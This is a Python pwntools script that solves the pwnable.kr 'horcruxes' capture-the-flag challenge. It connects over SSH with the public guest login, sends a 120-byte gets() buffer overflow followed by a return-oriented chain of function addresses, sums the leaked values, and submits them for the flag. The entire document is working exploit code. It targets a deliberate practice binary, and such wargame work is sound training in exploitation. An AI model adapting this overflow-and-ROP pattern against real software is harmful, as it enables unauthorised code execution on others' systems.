#! /usr/bin/python

from pwn import *
import ctypes

HOST = "pwnable.kr"
PORT = 2222
USER = "horcruxes"

LOCALPORT = 9032

shell = ssh(host=HOST, user=USER,
        port=PORT, password='guest')

# Array of addresses for our ROP chain
addrs = []

# Grab all the ROP addresses from the binary
e = elf.load('./horcruxes')
for func in ['A','B','C','D','E','F','G']:
    addrs.append(p32(e.functions[func].address))

# Start process
#p = process('./horcruxes')
# Connect to local socket
p = shell.connect_remote('localhost', LOCALPORT)

p.recvuntil('Select Menu:')
# Doesnt matter what menu you select
p.sendline('1')
p.recvuntil('did you earned? : ')
# gets() buffer starts at ebp-116
# So we need 116 bytes plus 4 bytes to overwrite ebp
# And then we can add the ROP address's
payload = ''
payload += 'A'*120
for addr in addrs:
    payload += addr

# Append ropme as our last function to hop to
#payload += p32(e.functions['ropme'].address)
payload += p32(0x0809FFFC)

# Send our payload
p.sendline(payload)

# Recveive a line of useless information
p.recvline()

# Parse messages and sum the EXP's
exp_sum = 0
for addr in addrs:
    p.recvuntil('EXP +')
    exp_sum += int(p.recvline().strip()[:-1])

p.recvuntil('Select Menu:')
p.sendline('1')
p.recvuntil('did you earned? : ')

# If we dont use ctypes to cast the sum to a 
# 32 bit int, then we dont consistently
# get the flag
p.sendline(str(ctypes.c_int(exp_sum).value))

print p.recvall()

p.close()
shell.close()
